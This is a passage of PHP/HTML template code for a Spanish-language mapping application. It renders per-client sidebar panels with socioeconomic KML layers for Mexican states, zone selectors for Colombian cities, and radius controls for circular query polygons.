                                            <a title="Editar Birck" href="https://fa1.censosmkd.com/edita_zacatecas.php?ciudad=Zacatecas"><img src="https://fa1.censosmkd.com/temas/default/_img/editar.png" alt="Editar Birck" width="20" height="20"/></a><br>
                                        </td>
                                        <td>
                                            <a title="Descargar Brick" href="https://fa1.censosmkd.com/temas/default/kml_faprueba/edit_kml/zacatecas1.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar Brick" width="20" height="20"/></a><br>
                                        </td>
                                    </tr>
                                </table>
                                </div>
                                    </div>
                                                              </div>';
                                                              }
}

if(isset($_SESSION['user'])){
    
  
if ($dominio=='faprueba' or $dominio=='fa1')
  {
    echo '<h2><a href="#">NSE</a></h2>
        <div>
            <div align="center">
                '.$colorNSE.'
                <br>
                <br>
                <div class="boxContenedor">
                    <table>
                        <tr>
                            <td>
                                <input  type="checkbox" name="nse2" id="nse2" onclick="muestraAguascalientes();" /> Aguascalientes<br>
                            </td>
                            <td>
                            </td>
                            <td>
                                <a title="Descargar NSE" href="https://fa1.censosmkd.com/temas/default/nse_kml/Aguascalientes.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar NSE" width="20" height="20"/></a><br>
                            </td>
                        </tr>
                        <tr>
                            <td>
                                <input  type="checkbox" name="nse3" id="nse3" onclick="muestraBCalifornia();" /> Baja California<br>
                            </td>
                            <td>
                            </td>
                            <td>
                                <a title="Descargar NSE" href="https://fa1.censosmkd.com/temas/default/nse_kml/Baja_California.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar NSE" width="20" height="20"/></a><br>
                            </td>
                        </tr>
                        <tr>
                            <td>
                                <input  type="checkbox" name="nse4" id="nse4" onclick="muestraBajaCaliforniaSur();" /> Baja California Sur<br>
                            </td>
                            <td>
                            </td>
                            <td>
                                <a title="Descargar NSE" href="https://fa1.censosmkd.com/temas/default/nse_kml/Baja_California_Sur.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar NSE" width="20" height="20"/></a><br>
                            </td>
                        </tr>
                        <tr>
                            <td>
                                <input  type="checkbox" name="nse5" id="nse5" onclick="muestraCampeche();" /> Campeche<br>
                            </td>
                            <td>
                            </td>
                            <td>
                                <a title="Descargar NSE" href="https://fa1.censosmkd.com/temas/default/nse_kml/Campeche.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar NSE" width="20" height="20"/></a><br>
                            </td>
                        </tr>
                        <tr>
                            <td>
                                <input  type="checkbox" name="nse1" id="nse1" onclick="muestraCDMX();" /> CDMX<br>
                            </td>
                            <td>
                               <!-- <a title="Editar NSE" href="https://fa1.censosmkd.com/NSE_edit_CDMX.php?entidad=9"><img src="https://fa1.censosmkd.com/temas/default/_img/editar.png" alt="Editar NSE" width="20" height="20"/></a><br>-->
                            </td>
                            <td>
                                <a title="Descargar NSE" href="https://fa1.censosmkd.com/temas/default/nse_kml/CDMX.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar NSE" width="20" height="20"/></a><br>
                            </td>
                        </tr>
                        <tr>
                            <td>
                                <input  type="checkbox" name="nse6" id="nse6" onclick="muestraChiapas();" /> Chiapas<br>
                            </td>
                            <td>
                            </td>
                            <td>
                                <a title="Descargar NSE" href="https://fa1.censosmkd.com/temas/default/nse_kml/Chiapas.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar NSE" width="20" height="20"/></a><br>
                            </td>
                        </tr>
                        <tr>
                            <td>
                                <input  type="checkbox" name="nse7" id="nse7" onclick="muestraChihuahua();" /> Chihuahua<br>
                            </td>
                            <td>
                            </td>
                            <td>
                                <a title="Descargar NSE" href="https://fa1.censosmkd.com/temas/default/nse_kml/Chihuahua.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar NSE" width="20" height="20"/></a><br>
                            </td>
                        </tr>
                        <tr>
                            <td>
                                <input  type="checkbox" name="nse8" id="nse8" onclick="muestraCoahuila();" /> Coahuila<br>
                            </td>
                            <td>
                            </td>
                            <td>
                                <a title="Descargar NSE" href="https://fa1.censosmkd.com/temas/default/nse_kml/Coahuila.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar NSE" width="20" height="20"/></a><br>
                            </td>
                        </tr>
                        <tr>
                            <td>
                                <input  type="checkbox" name="nse9" id="nse9" onclick="muestraColima();" /> Colima<br>
                            </td>
                            <td>
                            </td>
                            <td>
                                <a title="Descargar NSE" href="https://fa1.censosmkd.com/temas/default/nse_kml/Colima.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar NSE" width="20" height="20"/></a><br>
                            </td>
                        </tr>
                        <tr>
                            <td>
                                <input  type="checkbox" name="nse10" id="nse10" onclick="muestraDurango();" /> Durango<br>
                            </td>
                            <td>
                            </td>
                            <td>
                                <a title="Descargar NSE" href="https://fa1.censosmkd.com/temas/default/nse_kml/Durango.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar NSE" width="20" height="20"/></a><br>
                            </td>
                        </tr>
                        <tr>
                            <td>
                                <input  type="checkbox" name="nse11" id="nse11" onclick="muestraEdoMex();" /> Estado de México<br>
                            </td>
                            <td>
                            </td>
                            <td>
                                <a title="Descargar NSE" href="https://fa1.censosmkd.com/temas/default/nse_kml/EdoMex.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar NSE" width="20" height="20"/></a><br>
                            </td>
                        </tr>
                        <tr>
                            <td>
                                <input  type="checkbox" name="nse12" id="nse12" onclick="muestraGuanajuato();" /> Guanajuato<br>
                            </td>
                            <td>
                            </td>
                            <td>
                                <a title="Descargar NSE" href="https://fa1.censosmkd.com/temas/default/nse_kml/Guanajuato.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar NSE" width="20" height="20"/></a><br>
                            </td>
                        </tr>
                        <tr>
                            <td>
                                <input  type="checkbox" name="nse13" id="nse13" onclick="muestraGuerrero();" /> Guerrero<br>
                            </td>
                            <td>
                            </td>
                            <td>
                                <a title="Descargar NSE" href="https://fa1.censosmkd.com/temas/default/nse_kml/Guerrero.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar NSE" width="20" height="20"/></a><br>
                            </td>
                        </tr>
                        <tr>
                            <td>
                                <input  type="checkbox" name="nse14" id="nse14" onclick="muestraHidalgo();" /> Hidalgo<br>
                            </td>
                            <td>
                            </td>
                            <td>
                                <a title="Descargar NSE" href="https://fa1.censosmkd.com/temas/default/nse_kml/Hidalgo.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar NSE" width="20" height="20"/></a><br>
                            </td>
                        </tr>
                        <tr>
                            <td>
                                <input  type="checkbox" name="nse15" id="nse15" onclick="muestraJalisco();" /> Jalisco<br>
                            </td>
                            <td>
                            </td>
                            <td>
                                <a title="Descargar NSE" href="https://fa1.censosmkd.com/temas/default/nse_kml/Jalisco.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar NSE" width="20" height="20"/></a><br>
                            </td>
                        </tr>
                        <tr>
                            <td>
                                <input  type="checkbox" name="nse16" id="nse16" onclick="muestraMichoacan();" /> Michoacan<br>
                            </td>
                            <td>
                            </td>
                            <td>
                                <a title="Descargar NSE" href="https://fa1.censosmkd.com/temas/default/nse_kml/Michoacan.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar NSE" width="20" height="20"/></a><br>
                            </td>
                        </tr>
                        <tr>
                            <td>
                                <input  type="checkbox" name="nse17" id="nse17" onclick="muestraMorelos();" /> Morelos<br>
                            </td>
                            <td>
                            </td>
                            <td>
                                <a title="Descargar NSE" href="https://fa1.censosmkd.com/temas/default/nse_kml/Morelos.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar NSE" width="20" height="20"/></a><br>
                            </td>
                        </tr>
                        <tr>
                            <td>
                                <input  type="checkbox" name="nse18" id="nse18" onclick="muestraNayarit();" /> Nayarit<br>
                            </td>
                            <td>
                            </td>
                            <td>
                                <a title="Descargar NSE" href="https://fa1.censosmkd.com/temas/default/nse_kml/Nayarit.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar NSE" width="20" height="20"/></a><br>
                            </td>
                        </tr>
                        <tr>
                            <td>
                                <input  type="checkbox" name="nse19" id="nse19" onclick="muestraNuevoLeon();" /> Nuevo León<br>
                            </td>
                            <td>
                            </td>
                            <td>
                                <a title="Descargar NSE" href="https://fa1.censosmkd.com/temas/default/nse_kml/NuevoLeon.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar NSE" width="20" height="20"/></a><br>
                            </td>
                        </tr>
                        <tr>
                            <td>
                                <input  type="checkbox" name="nse20" id="nse20" onclick="muestraOaxaca();" /> Oaxaca<br>
                            </td>
                            <td>
                            </td>
                            <td>
                                <a title="Descargar NSE" href="https://fa1.censosmkd.com/temas/default/nse_kml/Oaxaca.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar NSE" width="20" height="20"/></a><br>
                            </td>
                        </tr>
                        <tr>
                            <td>
                                <input  type="checkbox" name="nse21" id="nse21" onclick="muestraPuebla();" /> Puebla<br>
                            </td>
                            <td>
                            </td>
                            <td>
                                <a title="Descargar NSE" href="https://fa1.censosmkd.com/temas/default/nse_kml/Puebla.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar NSE" width="20" height="20"/></a><br>
                            </td>
                        </tr>
                        <tr>
                            <td>
                                <input  type="checkbox" name="nse22" id="nse22" onclick="muestraQueretaro();" /> Queretaro<br>
                            </td>
                            <td>
                            </td>
                            <td>
                                <a title="Descargar NSE" href="https://fa1.censosmkd.com/temas/default/nse_kml/Queretaro.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar NSE" width="20" height="20"/></a><br>
                            </td>
                        </tr>
                        <tr>
                            <td>
                                <input  type="checkbox" name="nse23" id="nse23" onclick="muestraQuintanaRoo();" /> Quintana Roo<br>
                            </td>
                            <td>
                            </td>
                            <td>
                                <a title="Descargar NSE" href="https://fa1.censosmkd.com/temas/default/nse_kml/QuintanaRoo.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar NSE" width="20" height="20"/></a><br>
                            </td>
                        </tr>
                        <tr>
                            <td>
                                <input  type="checkbox" name="nse24" id="nse24" onclick="muestraSanLuisPotosi();" /> San Luis Potosi<br>
                            </td>
                            <td>
                            </td>
                            <td>
                                <a title="Descargar NSE" href="https://fa1.censosmkd.com/temas/default/nse_kml/SanLuisPotosi.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar NSE" width="20" height="20"/></a><br>
                            </td>
                        </tr>
                        <tr>
                            <td>
                                <input  type="checkbox" name="nse25" id="nse25" onclick="muestraSinaloa();" /> Sinaloa<br>
                            </td>
                            <td>
                            </td>
                            <td>
                                <a title="Descargar NSE" href="https://fa1.censosmkd.com/temas/default/nse_kml/Sinaloa.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar NSE" width="20" height="20"/></a><br>
                            </td>
                        </tr>
                        <tr>
                            <td>
                                <input  type="checkbox" name="nse26" id="nse26" onclick="muestraSonora();" /> Sonora<br>
                            </td>
                            <td>
                            </td>
                            <td>
                                <a title="Descargar NSE" href="https://fa1.censosmkd.com/temas/default/nse_kml/Sonora.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar NSE" width="20" height="20"/></a><br>
                            </td>
                        </tr>
                        <tr>
                            <td>
                                <input  type="checkbox" name="nse27" id="nse27" onclick="muestraTabasco();" /> Tabasco<br>
                            </td>
                            <td>
                            </td>
                            <td>
                                <a title="Descargar NSE" href="https://fa1.censosmkd.com/temas/default/nse_kml/Tabasco.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar NSE" width="20" height="20"/></a><br>
                            </td>
                        </tr>
                        <tr>
                            <td>
                                <input  type="checkbox" name="nse28" id="nse28" onclick="muestraTamaulipas();" /> Tamaulipas<br>
                            </td>
                            <td>
                            </td>
                            <td>
                                <a title="Descargar NSE" href="https://fa1.censosmkd.com/temas/default/nse_kml/Tamaulipas.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar NSE" width="20" height="20"/></a><br>
                            </td>
                        </tr>
                        <tr>
                            <td>
                                <input  type="checkbox" name="nse29" id="nse29" onclick="muestraTlaxcala();" /> Tlaxcala<br>
                            </td>
                            <td>
                            </td>
                            <td>
                                <a title="Descargar NSE" href="https://fa1.censosmkd.com/temas/default/nse_kml/Tlaxcala.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar NSE" width="20" height="20"/></a><br>
                            </td>
                        </tr>
                        <tr>
                            <td>
                                <input  type="checkbox" name="nse30" id="nse30" onclick="muestraVeracruz();" /> Veracruz<br>
                            </td>
                            <td>
                            </td>
                            <td>
                                <a title="Descargar NSE" href="https://fa1.censosmkd.com/temas/default/nse_kml/Veracruz.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar NSE" width="20" height="20"/></a><br>
                            </td>
                        </tr>
                        <tr>
                            <td>
                                <input  type="checkbox" name="nse31" id="nse31" onclick="muestraYucatan();" /> Yucatan<br>
                            </td>
                            <td>
                            </td>
                            <td>
                                <a title="Descargar NSE" href="https://fa1.censosmkd.com/temas/default/nse_kml/Yucatan.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar NSE" width="20" height="20"/></a><br>
                            </td>
                        </tr>
                        <tr>
                            <td>
                                <input  type="checkbox" name="nse32" id="nse32" onclick="muestraZacatecas();" /> Zacatecas<br>
                            </td>
                            <td>
                            </td>
                            <td>
                                <a title="Descargar NSE" href="https://fa1.censosmkd.com/temas/default/nse_kml/Zacatecas.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar NSE" width="20" height="20"/></a><br>
                            </td>
                        </tr>
                    </table>
                </div>
            </div>
        </div>';
  }
}

if(isset($_SESSION['user'])){
//if ($dominio=='faprueba')
if ($dominio=='faprueba')
  {
                                                          echo '<h2><a href="#">Egg Fried</a></h2>
                                                                <div>
                                                                    <div align="center">
                                      '.$color.'
                                <br>
                                <br>
                                <div class="boxContenedor">
                                

        <div class="circleh2">
          &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input  type="checkbox" name="consultas" id="btn1" value="1" onclick="filtrarholcim();" />  <font style=" font-size: 12px;">  Farmacias del Ahorro  </font>
        </div>


                                </div>
                                    </div>
                                    </div>';

}
}

//******************************************Caso demo1 para saber si es con probabilidad***********************************************************
                          if($dominio=='demo1' or $dominio=='franquicias')
                          {

                                                            echo '<h2><a href="#">Zonas</a></h2>
                                                                <div>
                                                                    <div align="left">

                                        <br/>
                                        <img src="' . DIR_TEMA_ACTIVO . '_img/04_maps.png" height="20"/><font size="2">Consulta la propabilidad de tu negocio por una zona u area determinada</font>
                                        <br /><br />
                                        <table>
                                          <tr>                                            <td width="160">
          <input type="checkbox" id="chkboxZona9" onclick="ir_a(\'Ciudad de México, México\'); chkActivarZonas(\'Zona9\'); " />
                    <a href="#"  onclick="ayuda(\'12\');">Metropolitana</a > <br />



           <input type="checkbox" id="chkboxZona11" onclick="ir_a(\'Ciudad de México, México\'); chkActivarZonas(\'Zona11\')" />
                   <a href="#"  onclick="ayuda(\'14\');">Sureste <br /></a >

           <input type="checkbox" id="chkboxZona12" onclick="ir_a(\'1\'); chkActivarZonas(\'Zona12\')" />
                   <a href="#"  onclick="ayuda(\'15\');">Centro <br /></a >
           <input type="checkbox" id="chkboxZona13" onclick="ir_a(\'2\'); chkActivarZonas(\'Zona13\')" />
                    Noreste   <br />
           <input type="checkbox" id="chkboxZona14" onclick="ir_a(\'3\'); chkActivarZonas(\'Zona14\')" />

          <a href="#"  onclick="ayuda(\'13\');">Norte </a > <br />

          <input type="checkbox" id="chkboxZona15" onclick="ir_a(\'3\'); chkActivarZonas(\'Zona15\')" />
                    Occidente  <br />
          <input type="checkbox" id="chkboxZona16" onclick="ir_a(\'3\'); chkActivarZonas(\'Zona16\')" />
                     Oriente   <br />
              </td>
              <td width="120">
          <br />
                    Operaciones <br />
                      <form name="frusuarios">
                       <select name="miszonas"  size="1" >
                    <option value="0">Ninguno</option>
             <option value="1">Poblacion</option>
             <option value="2">NSE</option>
             <option value="3">Seguro</option>
            </select>

               </form>  </td>
                                          </tr>
                                        </table>
                                        <br /><br /><br />
                                    </div>
                                                              </div>';
                                  //********zona 1



                          }

//*************************




          if($dominio=='coexito')
                          {
                                                                                      echo '<h2><a href="#">Zonas Cali </a></h2>
                                                                <div align="left" style="background: url(temas/default/_img/coexito1.jpg)" >
                                                                    <div  >

                                        <br/>
  <img src="' . DIR_TEMA_ACTIVO . '_img/04_maps.png" height="20"/><font size="2">  Delimita las zonas geograficas ubicacion Cali</a></font>
                                        <br /><br />
                                        <table>
                                          <tr >
                                           <td BACKGROUND="/default/_img/coexito1.jpg" align="left" bordercolor="#00CC00" width="250">

          <br />
          <input type="checkbox" id="chkboxZona6" onclick=" ir_a(\'Carrera 80 # Cali, Valle Del Cauca, Colombia\'); chkActivarZonas(\'Zona6\')" />
                    Zona 4 &nbsp&nbsp<br />

                    <input type="checkbox" id="chkboxZona1" onclick="ir_a(\'Acopi Yumbo, Valle del Cauca, Colombia\'); chkActivarZonas(\'Zona1\')" />
                    Zona Acopio <br />

           <input type="checkbox" id="chkboxZona5" onclick="ir_a(\' Parque La Alameda Calle 7, Cali, Valle del Cauca, Colombia\'); chkActivarZonas(\'Zona5\')" />
                    Zona 5  <br />

          <input type="checkbox" id="chkboxZona3" onclick="ir_a(\'Parque Santander Calle 34, Cali, Valle del Cauca, Colombia\'); chkActivarZonas(\'Zona3\')" />
                    Zona 6 &nbsp&nbsp<br />
                    <input type="checkbox"  id="chkboxZona4"  onclick="ir_a(\'Parque Cien Palos Calle 18 Cali, Valle Del Cauca\'); chkActivarZonas(\'Zona4\')" />
                    Zona 7 &nbsp&nbsp<br />
                    <input type="checkbox" id="chkboxZona2" onclick="ir_a(\'Laguna Del Pandaje Cali, Valle Del Cauca Colombia\'); chkActivarZonas(\'Zona2\')" />
                    Zona 8 &nbsp&nbsp<br />
          <br />


                                          </tr>
                                        </table>
                                        <br /><br />
                                    </div>
                                                              </div>

                                  <h2><a href="#">Zonas Pasto / Bucaramanga</a></h2>
                                                                <div align="left" style="background: url(temas/default/_img/coexito1.jpg)" >
                                                                    <div  >
                                      <table>
                                          <tr >
                                           <td BACKGROUND="/default/_img/coexito1.jpg" align="left" bordercolor="#00CC00" width="250">
          <h4>B U C A R A M A N G A</h4>
                    <input type="checkbox" id="CalichkboxZona1" onclick="ir_a(\'7.138433931 , -73.12035034\'); chkActivarZonasCali(\'Zona1\')" />
                    W - 4 &nbsp&nbsp<br />
          <input type="checkbox" id="CalichkboxZona2" onclick="ir_a(\'7.107178534 , -73.10394688\'); chkActivarZonasCali(\'Zona2\')" />
                    P - 2 &nbsp&nbsp<br />
          <input type="checkbox" id="CalichkboxZona3" onclick="ir_a(\'7.138921998 , -73.11247541\'); chkActivarZonasCali(\'Zona3\')" />
                    D - 2 &nbsp&nbsp<br />

          <h4>P A S T O </h4>
          <br />
          <input type="checkbox" id="CalichkboxZona4" onclick="ir_a(\' el pasto, colombia\'); chkActivarZonasCali(\'Zona4\')" />
                    P - 1 &nbsp&nbsp<br />
          <input type="checkbox" id="CalichkboxZona5" onclick="ir_a(\'el pasto, colombia\'); chkActivarZonasCali(\'Zona5\')" />
                    P - 2 &nbsp&nbsp<br />


          </td>


 </tr>
 </table>
                                      </div>
                                      </div>
      <h2><a href="#">Zonas Bogota</a></h2>
                                                                <div align="left" style="background: url(temas/default/_img/coexito1.jpg)" >
                                                                    <div  >
                                      <table>
                                          <tr >
                                           <td BACKGROUND="/default/_img/coexito1.jpg" align="left" bordercolor="#00CC00" width="250">

                    <h4>B O G O T A</h4>

                    <input type="checkbox" id="CalichkboxZona6" onclick="ir_a(\'bogota, colombia\'); chkActivarZonasCali(\'Zona6\')" />
                    Zona 1 &nbsp&nbsp<br />
           <input type="checkbox" id="CalichkboxZona7" onclick="ir_a(\'bogota, colombia\'); chkActivarZonasCali(\'Zona7\')" />
                    Zona 2 &nbsp&nbsp<br />
           <input type="checkbox" id="CalichkboxZona8" onclick="ir_a(\'bogota, colombia\'); chkActivarZonasCali(\'Zona8\')" />
                    Zona 3 &nbsp&nbsp<br />
           <input type="checkbox" id="CalichkboxZona9" onclick="ir_a(\'bogota, colombia\'); chkActivarZonasCali(\'Zona9\')" />
                    Zona 4 &nbsp&nbsp<br />
           <input type="checkbox" id="CalichkboxZona10" onclick="ir_a(\'bogota, colombia\'); chkActivarZonasCali(\'Zona10\')" />
                    Zona 5 &nbsp&nbsp<br />
           <input type="checkbox" id="CalichkboxZona11" onclick="ir_a(\'bogota, colombia\'); chkActivarZonasCali(\'Zona11\')" />
                    Zona 6 &nbsp&nbsp<br />
           <input type="checkbox" id="CalichkboxZona12" onclick="ir_a(\'bogota, colombia\'); chkActivarZonasCali(\'Zona12\')" />
                    Zona 8 &nbsp&nbsp<br />
           <input type="checkbox" id="CalichkboxZona13" onclick="ir_a(\'bogota, colombia\'); chkActivarZonasCali(\'Zona13\')" />
                    Zona 9 &nbsp&nbsp<br />
           <input type="checkbox" id="CalichkboxZona14" onclick="ir_a(\'bogota, colombia\'); chkActivarZonasCali(\'Zona14\')" />
                    Zona 10 &nbsp&nbsp<br />
           <input type="checkbox" id="CalichkboxZona15" onclick="ir_a(\'bogota, colombia\'); chkActivarZonasCali(\'Zona15\')" />
                    Zona 11 &nbsp&nbsp<br />
          </td>
 </tr>
 </table>
                                      </div>
                                      </div>

<h2><a href="#">Zonas Villavicencio</a></h2>
                                                                <div align="left" style="background: url(temas/default/_img/coexito1.jpg)" >
                                                                    <div  >
                                      <table>
                                          <tr >
                                           <td BACKGROUND="/default/_img/coexito1.jpg" align="left" bordercolor="#00CC00" width="250">

                    <h4>V I L L A V I C E N C I O</h4>

                    <input type="checkbox" id="CalichkboxZona16" onclick="ir_a(\'Cl. 21 #35-118 Villavicencio, Meta Colombia\'); chkActivarZonasCali(\'Zona16\')" />
                    Zona 9 &nbsp&nbsp<br />
           <input type="checkbox" id="CalichkboxZona17" onclick="ir_a(\'Cl. 21 #35-118 Villavicencio, Meta Colombia \'); chkActivarZonasCali(\'Zona17\')" />
                    Zona 10 &nbsp&nbsp<br />
           <input type="checkbox" id="CalichkboxZona18" onclick="ir_a(\' Cl. 21 #35-118 Villavicencio, Meta Colombia \'); chkActivarZonasCali(\'Zona18\')" />
                    Zona 20 &nbsp&nbsp<br />

 </tr>
 </table>
                                      </div>
                                      </div>




                                  ';

                          }

//**************************************************************************************************************************************************************
                          }


                             ?>
                                                        <h2><a href="#"> Pol&iacute;gono circular</a></h2>
                                                        <div>

                            <?php
                            if($dominio=='holcimmx' or $dominio=='fa1' or $dominio=='faprueba' or $dominio=='materiales')
{ ?> <div align="center"><b><font color="#58595A" size="2">1.- Define un punto en el mapa para hacer una consulta</font></b></div>
                              <?php } else { ?>
   <div align="center"><font color="green" size="2">1.- Define un punto en el mapa para hacer una consulta</font></div>
   <?php }
                              ?>
                                                            <br /><br /><br />


                                                            <div align="center"><img src=<?php echo '"' . DIR_TEMA_ACTIVO . '_img/04_maps.png"'; ?> height="20"/><font size="2">Navega a la localidad deseada. Puedes hacerlo <a href="#" onclick="buscar()">aqu&iacute;</a></font></div>

                                                            <!--<div align="center"><font color="green" size="2">Define un pol&iacute;gono circular con un radio determinado</font>
                                                              </div>
                                                        <ul style="margin-left:-35px;">
                                                            <li><img src="' . DIR_TEMA_ACTIVO . '_img/04_maps.png" height="20"/> Navega a la localidad deseada. Puedes hacerlo <a href="#" onclick="buscar()">aqu&iacute;</a></li>
                                                            <li><img src="' . DIR_TEMA_ACTIVO . '_img/lupa.png" height="20"/> Ajusta el acercamiento lo que considere necesario.</li>
                                                            <li>Marca el centro del pol&iacute;gono circular haciendo click sobre el mapa</li>
                                                            <li>Selecciona el radio del pol&iacute;gono.</li>
                                                            <li>Seleccionada el &aacute;rea deseada presione el bot&oacute;n siguiente para avanzar con el procesos de
                                <?php
//                                                            echo (esCorporativo()?
//                                                              'consulta':
//                                                              'compra');
                                                            ?>.</li>
                                                        </ul>
                                                            -->

                                                        <div style="margin-left:15px; margin-top:20px;">

                             <?php
               if($dominio=='holcimmx' or $dominio=='fa1' or $dominio=='faprueba' or $dominio=='materiales')
               {
                if (isset($_SESSION['user']))
                {
                    echo '<br /><b><font size="2" color="#151515">Cambiar Tama&ntilde;o</font></b><br /><br />';
                }
               }
               else
               {
               if (isset($_SESSION['user']))
                {
                    echo '<br /><font size="2" color="green">Cambiar Tama&ntilde;o</font><br /><br />';
                }
               }
                                ?>
                                                            Radio:
                                                            <select name="radioDefault" id="radioDefault" onchange="radioChange()">
                                                                <option value="1000">1 Kilomentro</option>
                                                                <option value="1500">1.5 Kilometros</option>
                                                                <option value="2000">2.0 Kilometros</option>
                                                                <?php
                                    if (isset($_SESSION['user'])){
                                      if (esPyme()){
                                        echo '<option value="3000">3.0 Kilometros</option>';
                                      }
                                      else {
                                        echo '<option value="Definir">Definir radio</option>';
                                      }
                                    }
                                                                ?>
                                                            </select>

                                                            <?php
                                                            if (esPyme()){
                                                              echo '<input type="hidden" id="radio" name="radio" value="1000" style="width:70px" onchange="ActivaCirculo()" readonly/> Mts.';
                                                            }
                                                            else {
                                                              echo '<input type=' . (isset($_SESSION['user']) ? '"number"' : '"hidden"') . ' id="radio" name="radio" min="0" value="1000" style="width:70px" onchange="ActivaCirculo()" /> ' .
                                    (isset($_SESSION['user']) ? 'Mts.' : '');
                                    echo '<input type= "hidden" id= "circulo2" name="circulo2" value="'.$iconfig ['pcirc'].'" />';
                                                            }
                                                          ?>
                                                               <br><br>
                                                               <?php
                                    if (isset($_SESSION['user'])){
                                ?>
                                                                  <table>
                                                                      <tr>
                                                                          <td>
                                                                              <font size="2">Activar Poblaci&oacute;n</font>
                                        <input type="checkbox" name="mostrarAgebsC" id="mostrarAgebsC"
                                        onclick="document.getElementById( 'mostrarAgebsL' ).checked = document.getElementById( 'mostrarAgebsC' ).checked;
                                        document.getElementById( 'mostrarAgebs2' ).checked = document.getElementById( 'mostrarAgebsC' ).checked; muestraAgebsPolilinea(polilinea);"/>
                                                                      </td>
                                                        

                                                                      <td><img style="display:none" class="mostrarAgebsImg" src=<?php echo '"' . DIR_TEMA_ACTIVO . '_img/waiting.gif"'; ?> /></td>
                                                                        </tr>
                                  <?php   if (($dominio=='franquicias')||($dominio=='fa1') ||($dominio=='faprueba'))
                                      { ?>

                                    <tr>
                                    <td>
                                                                              <font size="2">Activar NSE</font>
                                        <input type="checkbox" name="mostrarAgebsCNSE" id="mostrarAgebsCNSE"
                                        onclick="document.getElementById( 'mostrarAgebsLNSE' ).checked = document.getElementById( 'mostrarAgebsCNSE' ).checked;
                                        document.getElementById( 'mostrarAgebs2NSE' ).checked = document.getElementById( 'mostrarAgebsCNSE' ).checked; muestraAgebsPolilineaNSE(polilinea);"/>
                                                                      </td>

                                                                      <td><img style="display:none" class="mostrarAgebsImgNSE" src=<?php echo '"' . DIR_TEMA_ACTIVO . '_img/waiting.gif"'; ?> /></td>


                                    </tr>
                                    <?php } ?>
                                                                    </table>
                               <?php } ?>
                                                        </div>


                                                                    <!--
                                                        <div style="margin-left:10px;">
                                                            <img src="' . DIR_TEMA_ACTIVO . '_img/tip.png" width="20" height="20" align="right"/><font color="green">Puedes mover el centro del pol&iacute;gono circular simplemente haga click sobre el mapa!.</font>
                                                        </div>
                                                                    -->
                                                    </div>
                                                    <?php
                                                    // @DEIVY
                                                    //SECCION AGREGAR NUEVO POLOGONO PARA DESARROLLOS DELTA
                                                        if ($dominio=='desarrollosdelta')
                                                            {
                                                                
                                                                    $colorkml='<font color="gray" size="2">Selecciona para mostrar los poligonos.</font>';
                                                                    echo '<h2><a href="#">Poligonos zonas</a></h2>
                                                                        <div>
                                                                            <div align="center">
                                                                                '.$colorkml.'
                                                                                <br>
                                                                                <br>
                                                                                <div class="boxContenedor">
                                                                                    <table>
                                                                                        <tr>
                                                                                            <td>
                                                                                                <input  type="radio" name="polidelta" id="polidelta1" onclick="printaPD(\'APODACA\',\'polidelta1\',12);" /> Apodaca<br>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr>
                                                                                            <td>
                                                                                                <input  type="radio" name="polidelta" id="polidelta2" onclick="printaPD(\'CENTRO\',\'polidelta2\',13);" /> Centro<br>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr>
                                                                                            <td>
                                                                                                <input  type="radio" name="polidelta" id="polidelta3" onclick="printaPD(\'CENTRO_PONIENTE\',\'polidelta3\',14);" /> Centro Poniente<br>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr>
                                                                                            <td>
                                                                                                <input  type="radio" name="polidelta" id="polidelta4" onclick="printaPD(\'CHURUBUSCO\',\'polidelta4\',13);" /> Churubusco<br>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr>
                                                                                            <td>
                                                                                                <input  type="radio" name="polidelta" id="polidelta5" onclick="printaPD(\'COLINAS\',\'polidelta5\',14);" /> Colinas<br>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr>
                                                                                            <td>
                                                                                                <input  type="radio" name="polidelta" id="polidelta6" onclick="printaPD(\'CONTRY\',\'polidelta6\',13);" /> Contry<br>
                                                                                            </td>
                                                                                        </tr>
